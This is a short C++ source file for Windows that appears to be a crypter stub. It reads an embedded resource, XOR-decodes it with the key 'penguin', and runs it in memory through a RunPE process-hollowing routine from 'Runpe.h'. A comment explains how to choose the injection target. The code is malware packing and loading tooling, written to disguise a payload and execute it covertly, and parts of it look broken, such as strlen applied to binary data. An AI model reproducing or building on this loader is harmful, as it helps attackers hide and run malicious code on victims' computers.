#include <iostream>
#include <Windows.h>
#include <fstream>
#include "Runpe.h"
#include <string>


int Rsize;
int choice_size;
char* RData;
char* balls;
std::string choice;


void Resource(int id)
{
	HRSRC hResource = FindResource(NULL, MAKEINTRESOURCE(1), RT_RCDATA);
	HGLOBAL temp = LoadResource(NULL, hResource);
	Rsize = SizeofResource(NULL, hResource);
	RData = (char*)LockResource(temp);
}


void enc()
{
	if (RData[strlen(RData) - 1] == '1')
	{
		std::ofstream out("1.txt");
		out << RData[strlen(RData) - 1];
		out.close();
	}
	else if (RData[strlen(RData) - 1] == '2')
	{
		char cipher[] = "penguin";
		for (int i = 0; i < Rsize-1; i++)
		{
			RData[i] ^= cipher[i % strlen(cipher)]; // Simple Xor chiper
		}
	}
	else if (RData[strlen(RData) - 1] == '3')
	{
		std::ofstream out("3.txt");
		out << RData[strlen(RData) - 1];
		out.close();
	}
		return;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	Resource(1);
	enc();


	LPVOID pFile;
	TCHAR szFilePath[1024];
	
	pFile = RData;
	if (pFile)
	{
		GetModuleFileNameA(0, LPSTR(szFilePath), 1024);
		//replace process.exe with "szFilePath" if you want to inject it in the SAME file.
		//or you may write the file path you want to inject in.
		ExecFile(LPSTR(szFilePath), pFile);
	}
	return 0;
};